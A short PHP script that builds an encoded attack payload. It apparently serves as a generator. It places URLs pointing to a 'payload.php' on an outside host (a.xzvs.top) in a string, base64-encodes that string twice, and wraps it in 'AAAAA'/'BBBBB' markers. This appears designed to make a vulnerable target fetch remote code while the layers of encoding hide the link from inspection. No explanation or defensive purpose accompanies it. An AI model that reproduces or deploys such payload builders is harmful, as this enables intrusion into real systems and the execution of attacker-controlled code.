<?php

$inner = "http://a.xzvs.top$$http://a.xzvs.top/payload.php";

$encoded = base64_encode(base64_encode($inner));

echo "AAAAA" . $encoded . "BBBBB";
